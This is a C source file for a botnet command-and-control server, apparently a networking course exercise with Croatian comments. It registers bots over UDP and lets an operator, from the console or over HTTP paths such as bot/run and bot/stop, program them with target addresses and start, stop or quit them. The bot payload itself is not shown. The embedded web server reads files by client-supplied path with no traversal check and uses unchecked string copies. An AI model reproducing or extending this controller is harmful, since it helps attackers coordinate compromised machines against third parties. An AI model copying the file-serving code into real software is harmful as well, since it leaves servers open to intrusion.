#include<err.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<unistd.h>
#include<netinet/in.h>
#include<errno.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<signal.h>
#include "bot.h"

#define max(a,b) ( ( (a) > (b) ) ? (a) : (b) )
#define STDIN 0

#define ERROR 42
#define SORRY 43
#define LOG 44

struct{
		char *ext;
		char *filetype;
}extensions []={
		{"gif", "image/gif"},
		{"jpg", "image/jpg"},
		{"pdf", "text/pdf"},
		{"txt", "text/txt"},
		{"html", "text/html"},
		{"ico", "image/ico"},
		{0,0}
};

bots_cc bots;
clients_cc clients;		

int registered=0;
int udp_socket;

int Socket(int family, int type, int protocol){
		int succ=socket(family, type, protocol);
		char *error;
		if(succ < 0){
				error=strerror(errno);
				printf("%s\n", error);
		} 
		return succ;
		
}

int Bind(int sockfd, const struct sockaddr *myaddr, int addrlen){
	char *error;
	int err;
	err=bind(sockfd, myaddr, addrlen);
	if(err!=0){
		error=strerror(errno);
		printf("%s\n", error);
		exit(4);
	}else{
		return 0;
	}
}

int Sendto(int sockfd, void *buff, size_t nbytes, int flags, const struct sockaddr* to, socklen_t addrlen){
		int succ=sendto(sockfd, buff, nbytes, flags, to, addrlen);
		if(succ!=nbytes){
				printf("sendto error %d, nbytes is %d errno %d\n", succ, nbytes, errno);
				errx(2, "%s", strerror(errno));
		}
		return succ;
}	

void mylog(int type, char *s1, char *s2, int num){
		int fd;
		char logbuffer[8096*2];
		switch(type){
				case ERROR:
					sprintf(logbuffer, "ERROR: %s:%s Errno=%d exiting pid=%d", s1, s2, errno, getpid());
					break;
				case SORRY:
					sprintf(logbuffer, "<HTML><BODY><H1>Web Server Sorry: %s %s</H1></BODY></HTML>\r\n",s1,s2);
					write(num, logbuffer, strlen(logbuffer));
					sprintf(logbuffer, "SORRY: %s:%s", s1, s2);
					break;
				case LOG:
					sprintf(logbuffer, "INFO: %s:%s:%d", s1, s2, num);
					break;
					
		}
		if((fd=open("nweb.log", O_CREAT | O_WRONLY | O_APPEND, 0644))>0){
				write(fd, logbuffer, strlen(logbuffer));
				write(fd, "\n", 1);
				close(fd);
		}
		
		if(type==ERROR || type==SORRY)
			exit(1);
}
void web(int sock, int num){
	
		int file_fd;
		static char buffer[8096+1];
	
		long ret=read(sock, buffer, 8096);
		if(ret==0 || ret==-1){
				mylog(SORRY, "cant read browser reqest", "", sock);
		}
		if(ret>0 && ret<8096){
			buffer[ret]=0;
		} else {
				buffer[0]=0;
		}
		
		for(int i=0; i<ret; i++){
				if(buffer[i]=='\r' || buffer[i]=='\n')
					buffer[i]='*';
					
		mylog(LOG, "request", buffer, num);
		
		if(strncmp(buffer, "GET", 3) && strncmp(buffer, "get", 3)){
				mylog(SORRY, "Only simple GET operation supported", buffer, sock);
		}
		
		
		char *method= strtok(buffer, " ");
		char *filename = strtok(NULL, " ");
		
		if(filename[0]=='/') filename++;
		char header[1000]={0};
		message_from_cc msg;
		addresses_from_cc address;
		printf("Filename is: %s\n", filename);
		if(strncmp(filename, "bot/list", 8)==0){
			sprintf(header, "<HTML><BODY><H1>List of bots:</H1><ul></ul></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			memset(header, 0, sizeof(header));
			for(int i=0; i<registered; i++){
					addresses_from_cc bot = bots.bots[i];
					sprintf(header, "<HTML><BODY><ul><li>%s:%s</li></ul></BODY></HTML>\r\n", bot.ip, bot.port);
					write(sock, header, strlen(header));
			}

		}else if(strncmp(filename, "bot/prog_udp", 12)==0){
			
			memset(&msg, 0, sizeof(msg));
			strcpy(&msg.command, "2");
			strcpy(address.ip, "10.0.0.20\0");
			strcpy(address.port, "1234\0\n");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Programed udp successfully!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			
		}else if(strncmp(filename, "bot/prog_udp_localhost", 22)==0){
			
			memset(&msg, 0, sizeof(msg));

			strcpy(&msg.command, "2");
			strcpy(address.ip, "127.0.0.1\0");
			strcpy(address.port, "1234\0\n");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));	
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Programed udp localhost successfully!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));		
								
		}else if(strncmp(filename, "bot/prog_tcp", 12)==0){
			
			memset(&msg, 0, sizeof(msg));
			strcpy(&msg.command, "1");
			strcpy(address.ip, "10.0.0.20\0");
			strcpy(address.port, "1234\0\n");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Programed tcp successfully!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			
		}else if(strncmp(filename, "bot/prog_tcp_localhost", 22)==0){
			
			memset(&msg, 0, sizeof(msg));
			strcpy(&msg.command, "1");
			strcpy(address.ip, "127.0.0.1\0");
			strcpy(address.port, "1234\0\n");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Programed tcp localhost successfully!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
						
		}else if(strncmp(filename, "bot/run", 7)==0){
			printf("bot run\n");
			memset(&msg, 0, sizeof(msg));

			strcpy(&msg.command, "3");
			strcpy(address.ip, "127.0.0.1\0");
			strcpy(address.port, "vat\0\n");
			msg.pairs[0]=address;
			addresses_from_cc addr2;
			strcpy(addr2.ip, "127.0.0.1\0");
			strcpy(addr2.port, "6789\0\n");
			msg.pairs[1]=addr2;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent run: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Run bots success!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			
		}else if(strncmp(filename, "bot/stop", 8)==0){
			memset(&msg, 0, sizeof(msg));

			strcpy(&msg.command, "4");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Stop bots success!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			
		}else if(strncmp(filename, "bot/quit", 8)==0){
			memset(&msg, 0, sizeof(msg));

			strcpy(&msg.command, "0");
			msg.pairs[0]=address;
			for(int i=0; i<registered; i++){
					struct sockaddr_in cli=clients.clients[i];
					int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
					printf("Bytes sent: %d\n", b);
			}
			memset(header, 0, sizeof(header));

			sprintf(header, "<HTML><BODY><h>Quit bots success!</h></BODY></HTML>\r\n");
			write(sock, header, strlen(header));
			printf("time to quit...\n");
			sleep(1);
			exit(1);
		}else {
			memset(header, 0, sizeof(header));
			printf("File: %s\n", filename);
			if(access(filename, F_OK)!=0){
				sprintf(header, "<HTML><BODY><H1> Web Server Sorry: 404 Not Found</H1></BODY></HTML>\r\n");
				write(sock, header, strlen(header));
				return;
			}
			strcpy(buffer, filename);
			int buflen=strlen(buffer);
			int len;
			char *fstr;
			fstr=(char *)0;
			printf("Buffer: %s\n", buffer);
			for(int i=0; extensions[i].ext !=0; i++){
					len=strlen(extensions[i].ext);
					if(!strncmp(&buffer[buflen-len], extensions[i].ext, len)){
							fstr=extensions[i].filetype;
							break;
					}
			}
		
			if(fstr==0){
					mylog(SORRY, "file extension type not supported", buffer, sock);
			}
			
			if((file_fd = open(&buffer, O_RDONLY))==-1)
					mylog(SORRY, "failed to open file", &buffer[5], sock);
					
			mylog(LOG, "SEND", &buffer, 1);
			
			(void)sprintf(buffer, "HTTP/1.0 200 OK\r\nContent-Type: %s\r\n\r\n", fstr);
			(void)write(sock, buffer, strlen(buffer));
			
			while((ret=read(file_fd, buffer, 8096))>0)
				(void)write(sock, buffer, ret);
		}
		sleep(1);
}
}


int main(int argc, char *argv[]){
		
		int tcp_port, udp_port;
		int listen_socket, peer_socket;
		
		char tcp_portnum[10]="80";
		char udp_portnum[10]="5555";
		char buff[1024];
		char clientAddr[100];

		int num=0;
		static struct sockaddr_in cli_addr;
		static struct sockaddr_in serv_addr;

		struct sockaddr_in cliaddr, myaddr;
		struct timeval tv={5,0};
		fd_set readfds;
		
		//bots_cc bots;
		//clients_cc clients;		
		socklen_t len;
		
		if(argc==0 || argc>2){
			printf("Usage: ./CandC [tcp_port]\n");
			exit(1);
		}
		
		if(argc==2){
				strcpy(tcp_portnum, argv[1]);
		}
		//TCP port
		tcp_port=atoi(tcp_portnum);
		
		if(tcp_port==0){
				struct servent *serv = getservbyname(tcp_portnum, "tcp");
				int pnum=htons(serv->s_port);
				tcp_port=pnum;
				printf("service port: %d\n", pnum);
		}else{
			sscanf(tcp_portnum, "%d", &tcp_port);	
		}
		
		//UDP port
		sscanf(udp_portnum, "%d", &udp_port);
		
		//UDP DIO
		struct sockaddr_in udpaddr;
		memset(&udpaddr, 0, sizeof(udpaddr));

		udpaddr.sin_family=AF_INET;
		udpaddr.sin_addr.s_addr=INADDR_ANY;
		udpaddr.sin_port=htons(udp_port);
		memset(udpaddr.sin_zero, '\0', sizeof(udpaddr.sin_zero));
		
		udp_socket=Socket(AF_INET, SOCK_DGRAM, 0);

		Bind(udp_socket, (struct sockaddr*) &udpaddr, sizeof(udpaddr));

		printf("udp sock listening\n");
		//TCP DIO
		//=========================================================================
		listen_socket=Socket(AF_INET, SOCK_STREAM, 0);
		
		bzero(&myaddr, sizeof(myaddr));
		myaddr.sin_family=AF_INET;
		myaddr.sin_addr.s_addr=htonl(INADDR_ANY);
		myaddr.sin_port=htons(tcp_port);
	
		memset(myaddr.sin_zero, '\0', sizeof(myaddr.sin_zero));
		
		if(bind(listen_socket, (struct sockaddr *)&myaddr, sizeof(myaddr))!=0){
				printf("Couldnt bind\n");
				exit(-1);
		}
		printf("bind OK...\n");
		
		if(listen(listen_socket, 1) == -1){
				printf("Error on listen\n");
				exit(-1);
		}
		
		printf("tcp listening...\n");
		//========================================================================
		
		FD_ZERO(&readfds);
		int fd_tcp=0;
		int max=max(listen_socket, udp_socket);
		printf("udp: %d, listen: %d\n", udp_socket, listen_socket);
		
		(void)signal(SIGCHLD, SIG_IGN);

		while(1){
				FD_ZERO(&readfds);
				
				FD_SET(STDIN, &readfds);
				FD_SET(udp_socket, &readfds);
				FD_SET(listen_socket, &readfds);
				
				tv.tv_sec=3;
				int retval=select(max+1, &readfds, NULL, NULL, &tv);
				
				if(FD_ISSET(udp_socket, &readfds)){
						char buff[1024];
						char por[20];
						
						struct sockaddr_in cliaddr;
						
						memset(buff, '\0', sizeof(buff));
						len=sizeof(cliaddr);
						
						bzero(buff, sizeof(buff));
						int bytes_recieved = recvfrom(udp_socket, buff, sizeof(buff), 0, (struct sockaddr*)&cliaddr, &len);
						if(strcmp(buff, "REG\n")==0){
							printf("%s", buff);
						}
						inet_ntop(AF_INET, &(cliaddr.sin_addr), clientAddr, 100);
						uint16_t portNo = ntohs(cliaddr.sin_port);
						printf("Spojio se: %s:%d\n", clientAddr, portNo);
						addresses_from_cc adr;
						sprintf(por, "%d", portNo);
						strcpy(adr.ip, clientAddr);
						strcpy(adr.port, por);
						bots.bots[registered]=adr;
						clients.clients[registered]= cliaddr;
						registered++;
				}
				//printf("Is stdin set?\n");
				if(FD_ISSET(STDIN, &readfds)){
						char messg[1024+5];
						memset(messg, 0, sizeof(messg));
						read(STDIN, messg, sizeof(messg));
						
						message_from_cc msg;
						addresses_from_cc address;
						
						if(strcmp(messg, "pt\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "1");
								strcpy(address.ip, "10.0.0.20\0");
								strcpy(address.port, "1234\0\n");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
						}
						else if(strcmp(messg, "ptl\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "1");
								strcpy(address.ip, "127.0.0.1\0");
								strcpy(address.port, "1234\0\n");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
						}
						else if(strcmp(messg, "pu\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "2");
								strcpy(address.ip, "10.0.0.20\0");
								strcpy(address.port, "1234\0\n");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
						}
						else if(strcmp(messg, "pul\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "2");
								strcpy(address.ip, "127.0.0.1\0");
								strcpy(address.port, "1234\0\n");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}	
						}
						else if(strcmp(messg, "r\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "3");
								strcpy(address.ip, "127.0.0.1\0");
								strcpy(address.port, "vat\0\n");
								msg.pairs[0]=address;
								addresses_from_cc addr2;
								strcpy(addr2.ip, "127.0.0.1\0");
								strcpy(addr2.port, "6789\0\n");
								msg.pairs[1]=addr2;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
						}
						else if(strcmp(messg, "r2\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "3");
								strcpy(address.ip, "20.0.0.11\0");
								strcpy(address.port, "1111\0\n");
								msg.pairs[0]=address;
								addresses_from_cc addr2;
								strcpy(addr2.ip, "20.0.0.12\0");
								strcpy(addr2.port, "2222\0\n");
								msg.pairs[1]=addr2;
								addresses_from_cc addr3;
								strcpy(addr3.ip, "20.0.0.13\0");
								strcpy(addr3.port, "dec-notes\0\n");
								msg.pairs[2]=addr3;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}	
						}
						else if(strcmp(messg, "s\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "4");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
						}
						else if(strcmp(messg, "l\n")==0){
								printf("Naredba: %s\n", messg);
								for(int i=0; i<registered; i++){
										addresses_from_cc bot = bots.bots[i];
										printf("%s:%s\n", bot.ip, bot.port);
								}
						}
						else if(strcmp(messg, "n\n")==0){
								printf("Naredba: %s\n", messg);
								
								printf("NEPOZNATA\n");	
						}
						else if(strcmp(messg, "q\n")==0){
								printf("Naredba: %s\n", messg);
								strcpy(&msg.command, "0");
								msg.pairs[0]=address;
								for(int i=0; i<registered; i++){
										struct sockaddr_in cli=clients.clients[i];
										int b=Sendto(udp_socket, &msg, sizeof(msg), 0, (struct sockaddr*) &cli, sizeof(cli));
										printf("Bytes sent: %d\n", b);
								}
								exit(0);	
						}
						else if(strcmp(messg, "h\n")==0){
								printf("Naredba: %s\n", messg);
								printf("pt\nptl\npu\nptl\nr\nr2\ns\nl\nn\nq\nh\n");	
						}
				}
				
				if(FD_ISSET(listen_socket, &readfds)){
						struct sockaddr_in peer;
						int len=sizeof(peer);
						if((peer_socket=accept(listen_socket, (struct sockaddr*)&peer, &len))==-1){
									printf("Accept error\n");
									exit(-1);
						}
						
						switch(fork()){
								case -1:
									printf("fork error\n");
									exit(1);
								case 0:
									close(listen_socket);
									web(peer_socket, num);
									num++;
									close(peer_socket);
									break;
								default:
									close(peer_socket);// ne bi li trebalo zatvoriti main parentu
						}
				}
		}
		
		//BECOME DAEMON  UNSTOPABLE AND NO ZOMBIE CHILDREN
		//========================================================================
		/*if(fork()!=0){
				return 0;
		}
		(void)signal(SIGCHLD, SIG_IGN);
		(void)signal(SIGHUP, SIG_IGN);
		for(int i=0; i<32; i++)
			close(i);
		(void)setpgrp(0,0); //break away from process group
		
		MyLog(LOG, "nweb starting", argv[1], getpid());
		
		//SETUP THE NETWORK SOCKET
		if((listenfd))
		
		*/
		return 0;
}

